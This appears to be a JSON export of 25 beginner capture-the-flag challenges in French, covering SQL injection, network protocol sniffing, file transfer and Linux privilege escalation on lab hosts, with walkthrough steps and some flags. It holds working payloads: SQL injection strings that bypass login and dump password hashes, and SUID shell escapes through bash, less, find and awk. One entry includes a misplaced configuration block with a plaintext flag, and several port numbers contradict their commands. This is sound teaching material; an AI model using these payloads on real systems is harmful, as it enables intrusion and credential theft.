{"count": 25, "results": [
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Une Authent en béton",
        "max_attempts": 0,
        "type": "standard",
        "id": 1,
        "value": 10,
        "description": "\nOuvre un navigateur sur l'url http://10.0.0.10:8080/login.php\nTente de te commecter avec le compte admin et le mote de passe admin. On ne sait jamais...\nComment passer l'authentification quand on ne connait pas le mot de passe ?\nPar chance, le site est encore en protoype et le développeur a laissé actif des options pour débugguer.\nTu vois qu'il utilise une base de donnée SQL pour gérer les utilisateurs.\nIl utilise la requête :SELECT * FROM users WHERE login='admin' AND passwd=md5('admin')\nAjoute une quote ' à la fin du nom de user et regarde le résultat...\nCette quote a corrompu la requête SQL. Good. Nous pouvons la modifier pour la réécrire.\nEssaye de te connecter avec comme nom de compte: admin' or 1=1#\nNous générons la requète: SELECT * FROM users WHERE login='admin' or 1=1#' AND passwd=md5('admin')\nTous les caractère après le # sont ignorés comme des commentaires.\nLe filtre devient login='admin' or 1=1\nNous sommes authentifié comme le premier user de la base de donnée."
    },
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Une balade de santé",
        "max_attempts": 0,
        "type": "standard",
        "id": 2,
        "value": 10,
        "description": "\nRegarde l'url de consultation des messages. Et le texte de débug en bas.\nLa valeur 673489 est passée en paramètre de la requète SQL.\nNous allons faire une Injection SQL utilisant UNION.\nRemplace cette valeur par : 673489 UNION select login from users\nTu vas générer la requète : SELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users\nQui va ajouter la liste des utilisateurs à la fin de la liste des messages."
    },
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Dans ton SQL, s'il te plait monsieur",
        "max_attempts": 0,
        "type": "standard",
        "id": 3,
        "value": 10,
        "description": "\nContinue sur la même url. CEtte fois, en plus de noms de susers, on va récupérer le hash de leurs password...\nRemplace la paramètre par : 673489 UNION select concat(login,\" \",passwd) from users\nTu vas générer la requète : SELECT msg FROM messages WHERE idmsg= 673489 UNION select concat(login,\" \",passwd) from users\nQui va concaténer la liste des users le leurs hash de password à la fin de la liste des messages."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Netcat",
        "max_attempts": 0,
        "type": "standard",
        "id": 4,
        "value": 10,
        "description": "\nL'outil 'netcat', nc de son petit nom, est LE couteau suisse du CTF.\nIl permet d'ouvrir un port en écoute, de s'y connecter à distance et d'envoyer un flux de données comme des messages textes ou des lignes de commande.\nIls passent tels quels sur le réseau.\nOuvre le fichier en attachement avec Wireshark, sélectionne un des paquets de l'échange, fais Click droit - Suivre - Flux TCP."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Telnet",
        "max_attempts": 0,
        "type": "standard",
        "id": 5,
        "value": 10,
        "description": "\nLe protocole Telnet permet de se connecter três simplement à un serveur distant.\nIl commence par négocier les capacités de l'affichage, et permet ensuite une authentification simple par login/mot de passe.\nLe loin/mot de passe circule bien sur en clair sur le réseau...\nLe flag change un peut de format, ce sera flag_xxxx. Ce sera le login de l'utilisateur.\nOn se demande pourquoi on recommande ssh ..."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Telnet again",
        "max_attempts": 0,
        "type": "standard",
        "id": 6,
        "value": 10,
        "description": "\nTelnet permet d'executer des commande shell à distance.\nVisiblement le Chief des Admins a fait un cat de son flag...."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Ftp",
        "max_attempts": 0,
        "type": "standard",
        "id": 7,
        "value": 10,
        "description": "\nLe protocole ftp permet de se connecter, se déplacer dans une arborescence de répertoires, et télécharger/uploader des fichiers.\nUn premier flux entre les ports 21 et 35952 (click droit, suivre..) sert à l'authentification:\nUSER xxx\nPASS yyy\net au téléchargement d'un fichier RETR flag04.txt.\nLe contenu du fichier est transféré sur un autre port négocié dynamiquement.\nEnlevez le filtre wireshark qui s'est mis en place quand vous avez fait click droit-suivre-tcp.\nLe protocole des paquets est de type FTP-DATA, c'est trop facile de retrouver un flag dans ces conditions..."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "SMTP",
        "max_attempts": 0,
        "type": "standard",
        "id": 8,
        "value": 10,
        "description": "\nTous ces protocoles sont de vraies passoires, je vais plut\\u00f4t envoyer un mail...\nHistoriquement, pour envoyer un mail, on se connectait à la main sur un serveur SMTP et on utilisait les commandes:\nHELO xxx\nMAIL FROM: <martine@myfirstctf.org>\nRCPT TO: <chief_admin@myfirstctf.org>\nDATA\net je tape tout ce que je veux en terminant par un point tout seul.\n.\nMon mail est parti :)"
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Copier - Coller",
        "max_attempts": 0,
        "type": "standard",
        "id": 9,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier flag01_enc.bin sur ton Kali.\n```\ncat flag01_enc.bin\n```\nEt oui, c est du binaire illisible.\n```bash\n$ ssh user1@10.0.0.10 -p 2224\n```\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user 'user1' et le mot de passe 'password'.\nLe programme dechiffre_01 va te déchiffrer le fichier flag01_enc.bin une fois transféré sur le serveur.\n```\ncat flag01_enc.bin | base64\n```\nSur ton kali, encode flag01_enc.bin en base64. L encodage base64 permet de transférer des fichier binaires en mode texte.\n```\necho \\\"RXQgb3VpLCDDp2EgbWFyY2hlCg===\\\"| base64 --decode > flag01_enc\n```\nFais ensuite un copier/coller de la chaine base64 générée qui ressemble à RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur.\nDécode avec base64 --decode, et sauve dans le fichier flag01_enc.\n```\ndechiffre_01 flag01_enc flag01.txt\n```\nUtilise dechiffre_01 pour déchiffrer le flag encodé et le sauver dans flag01.txt"
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Secure copy",
        "max_attempts": 0,
        "type": "standard",
        "id": 10,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier dechiffre_02 sur ton Kali.\n```\nls -al dechiffre_02\n```\nIl fait 8k, c est un peu gros cette fois pour un copier/coller...\n```bash\n$ ssh user1@10.0.0.10 -p 2224\n```\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user 'user1' et le mot de passe 'password'.\n```\nscp -P 2224 dechiffre_02 user1@10.0.0.10:dechiffre02\n```\nTu as un accés ssh, utilise le mode de transfert de fichier de ssh."
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Hep Serveur !",
        "max_attempts": 0,
        "type": "standard",
        "id": 11,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier dechiffre_03 sur ton Kali.\n```\npython -m SimpleHTTPServer 8080\n```\nDans le même répertoire que ce fichier, lance un serveur web avec une ligne de python.\nTon Kali dispose maintenant d un serveur web prêt à transférer les fichiers localisés dans le même répertoire.\n```bash\nifconfig\n```\nRecupère l adresse IP de ton Kali.\n```bash\n$ ssh user1@10.0.0.10 -p 2224\n```\nPuis connecte toi au serveur en 10.0.0.10, sur le port 2224, avec le user 'user1' et le mot de passe 'password'.\n```bash\nwget http://[IP de ton Kali]:8080/dechiffre_03\n```\nRécupère le fichier en utilisant une requête HTTP."
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "J ai le shell qui colle",
        "max_attempts": 0,
        "type": "standard",
        "id": 12,
        "value": 10,
        "description": "\n```bash\n$ ssh theprofessor@10.0.0.10 -p PORT\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT, avec le user 'theprofessor' et le mot de passe 'darko'.\n```bash\nid\n```\nUtilise la commande id pour savoir quel est ton userId, et à quels groupes tu appartiens.\nVa faire un tour dans le /home de tokio.\n```\ncd /home/bash\nls -al find\n```\nTu vois ce petit s ? Tokio a laissé trainer l executable du shell bash avec un sticky bit activé. Si tu lances ce shell, il va s executer sous le userId de son propriétaire, tokio.\n```\n./bash\n```\nN oublie pas le ./ du bash, pour executer ce binaire et pas celui contenu dans ton $PATH.\n```\nid\n```\nQui es tu maintenant ?"
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "Pas moins",
        "max_attempts": 0,
        "type": "standard",
        "id": 13,
        "value": 10,
        "description": "\n```bash\n$ ssh tokio@10.0.0.10 -p 2223\n```\nConnecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user 'tokio' et le mot de passe 'esther'.\n```\nid\n```\nRegarde quel est ton id\n```\ncd /home/moscow\n```\nVa dans le répertoire de moscow\n```\nls -al flag02.txt\ncat flag02.txt\n```\nEssaye de lire son flag.\n```\nls -al\n./less flag02.txt\n```\nLe binaire less possède un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se déplacer en avant et en arrière. Tu vas pouvoir lire le fichier comme si tu étais moscow.\nSors du less en tapant 'q'.\nTu peux ouvrir un shell en tapant '!sh'.\n```\nid\ncat flag02.txt\n```"
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "Trouvé !",
        "max_attempts": 0,
        "type": "standard",
        "id": 14,
        "value": 10,
        "description": "\n```bash\n$ ssh moscow@10.0.0.10 -p 2222\n```\nConnecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user 'moscow' et le mot de passe 'alvaro'.\n```\nid\n```\nRegarde quel est ton id\n```\ncd /home/rio\n```\nVa dans le répertoire de rio\n```ls -al flag03.txt\ncat flag03.txt\n```\nEssaye de lire son flag.\n```\nls -al\n./find . -name flags.yml -exec id \\\\;\n```Le binaire find possède un sticky bit. Tu vas pouvoir l'utiliser comme si tu étais rio.\nL'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.\n```\n./find . -name flags.yml -exec cat {} \\\\;\n```\nLisons le flag.\n```\n./find . -name flags.yml -exec /bin/bash \\\\;\n```\nEt ouvrons un shell.\n```\nid\n```\n[Challenge_4]\nname:  Une petite histoire du temps\nvalue: 10\ncategory:  Privilege Escalation\nflag:  flag04{sup3r_j_4im3_l3s_f3ux_d3_j01e}\n#file:\ndescription:\n```bash\n$ ssh rio@10.0.0.10 -p 2222\n```\nConnecte toi au serveur en 10.0.0.10, sur le port 2223, avec le user 'rio' et le mot de passe 'paco'.\n```\nid\n```\nRegarde quel est ton id\n```\ncd /home/berlin\n```\nVa dans le répertoire de berlin\n```\nls -al\n./awk 'BEGIN{system(\\\"id\\\")}'\n```\nLe binaire awk possède un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l'utiliser comme si tu étais rio. Il permet de lancer des commandes shell. Utilise le pour lancer la commande id.\n```\n./awk 'BEGIN{system(\\\"cat flag04.txt\\\")}'\n```\nLisons le flag.\n```\n./awk 'BEGIN{system(\\\"/bin/bash\\\")}'\n```\nEt ouvrons un shell.\n```\nid\n```"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Intro",
        "max_attempts": 0,
        "type": "standard",
        "id": 15,
        "value": 5,
        "description": "\nCopie le Flag flag_{m0n_pr3m13r_fl4g} pour valider ce challenge !"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "LolCatz",
        "max_attempts": 0,
        "type": "standard",
        "id": 16,
        "value": 10,
        "description": "\nHello, jeune Padawan !\nLe chemin pour devenir un Jedi est long. Nous allons faire tes premiers pas ensemble...\n```\nbash\n$ ssh luke@10.0.0.10 -p 2222\n```\nConnecte toi au serveur en 10.0.0.10, sur le port 2222, avec le user 'luke' et le mot de passe 'tatooine'.\n```bash\n$ pwd\n```\nDans quel répertoire es tu connecté ?\n```bash\n$ ls\n```\nQuel sont les fichiers de ce répertoire ?\n```\n$ cat flag1.txt\n```\nQue contient le fichier flag1.txt ?\nCopie ce Flag de la forme flagxxx{yyy} pour valider ce challenge !"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Crouching Tiger, Hidden Dragon",
        "max_attempts": 0,
        "type": "standard",
        "id": 17,
        "value": 10,
        "description": "\nParfois les fichiers sont cachés en plein jour.\n```bash\n$ ssh yoda@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'yoda' et le mot de passe 'naboo'.\n```\nls -al\n```\nListe les fichiers cachés, et affiche des infos sur le propriétaire et les groupes."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Home Sweet Home",
        "max_attempts": 0,
        "type": "standard",
        "id": 18,
        "value": 10,
        "description": "\n```bash\n$ ssh obiwan@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'obiwan' et le mot de passe 'hoth'.\nComment \\u00e7a le frigo est vide ?\nEt comment est celui de la voisine  ?\nJete un oeil chez /home/padme...\nLes répertoires des utilisateurs sont le plus souvent dans le répertoire /home. Celui de l'administrateur en /root.\nCe sont les répertoires à examiner en priorité... Ils sont parfois autorisés en lecture."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "C'est juste temporaire",
        "max_attempts": 0,
        "type": "standard",
        "id": 19,
        "value": 10,
        "description": "\nConnecte toi en ssh à 10.0.0.11 avec le user dooku et le password dagobah.\n```bash\nfind / -name flag*.txt\n```\nUtilise la commande find pour rechercher tous les fichiers qui ont un nom du type flagXX.txt\nLes utilisateurs et administrateurs laissent souvent des fichiers interessant dans les répertoires temporaires comme /tmp et /var/tmp."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Résidence secondaire",
        "max_attempts": 0,
        "type": "standard",
        "id": 20,
        "value": 10,
        "description": "\n```bash\n$ ssh jarjar@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'jarjar' et le mot de passe 'shili'.\nCertains comptes systême comme les serveur web ou de base de donnée n'ont pas de répertoire du tout, ou un répertoire situé dans les données de leur application.\nOn les trouve en derniêre colonne du fichier /etc/passwd qui est toujours en lecture par tous.\nOu se trouve le home du compte mace ?\nLes flags sont le plus souvent aléatoires... ou presque."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "My sweet Business Executive",
        "max_attempts": 0,
        "type": "standard",
        "id": 21,
        "value": 10,
        "description": "\n```bash\n$ ssh quigong@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'quigong' et le mot de passe 'bespin'.\n```\n./welcome_07\n```\nLancer un fichier exécutable dans le répertoire courant avec ./xxxxx.\n```\nstrings welcome_07\n```\nDumper les cha\\u00eenes de caractêres contenues dans le binaire. On y trouve généralement les noms de fichiers de config, et parfois des comptes ou de mots de passe en clair."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Agent Double",
        "max_attempts": 0,
        "type": "standard",
        "id": 22,
        "value": 10,
        "description": "\n```bash\n$ ssh grievous@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'grievous' et le mot de passe 'yavin'.\nUtilise les informations qui ont leaké pour te faire passer pour leia avec la commande: su - lea"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Attrape moi si tu peux",
        "max_attempts": 0,
        "type": "standard",
        "id": 23,
        "value": 10,
        "description": "\n```bash\n$ ssh han@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'han' et le mot de passe 'ando'.\nOutch, ce fichier est vraiment gros... Ca va prendre des heures de le lire...\n```\ngrep flag liste10.txt\n```\nFiltrons le pour n'afficher que les lignes avec le mot 'flag'.\nJ'ai plein de temps pour improver mon skillz à kandykrush maintenant... C'est qui le plus malin ?"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Y en a un peu plus, j'vous le mets quand même ?",
        "max_attempts": 0,
        "type": "standard",
        "id": 24,
        "value": 10,
        "description": "\n```bash\n$ ssh c3po@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'c3po' et le mot de passe 'corellia'.\nLes fichiers zip sont des souvent utilisés pour faire des sauvegardes. On y trouve parfois des fichiers de config avec des infos três intéressantes.\n```\nhead flag11.zip\n```\nAffiche les premiêres lignes du fichier zip avec head. L'entête commence par PK, c'est bien un zip, on peut lire le nom des fichiers qu'il contient et le flag parait être en clair.\nIntéressant... L'algo ne compresse pas les tout petits fichiers...\n```\nunzip flag11.zip\n```\nIl est utile de connaitre les différents outils de compression : zip, unzip, 7zip, rar,... et savoir reconnaitre leurs entêtes caractéristiques."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Du goudron et des plumes",
        "max_attempts": 0,
        "type": "standard",
        "id": 25,
        "value": 10,
        "description": "\n```bash\n$ ssh finn@10.0.0.10 -p PORT_22\n```\nConnecte toi au serveur en 10.0.0.10, sur le port PORT_22, avec le user 'finn' et le mot de passe 'yavin'.\nLa commande tar était utilisée sur les anciens systêmes pour faire tenir toute une arborescence de fichiers en un seul fichier xxx.tar, qui était ensuite compressé avec l'algorithme gzip.\nOn se retrouvait avec un fichier xxx.tar.gz, ou xxx.tgz.\nRegarde le contenu du fichier avec vi.\nL'éditeur est carrément old school, mais il est utile de le conna\\u00eetre car il est présent presque partout.\nIl faut presser la touche [Esc] pour passer en mode commande et taper\n```\n:q!\n```\npour quitter sans rien modifier.\nOn peut y lire le nom des fichiers, les répertoires et le contenu des fichiers...\nvim est plus sympathique, mais pas toujours installé, il reconnait le format tar et l'affiche proprement.\nMais là encore [Esc] suivi de ':q!'."
    }
], "meta": {}}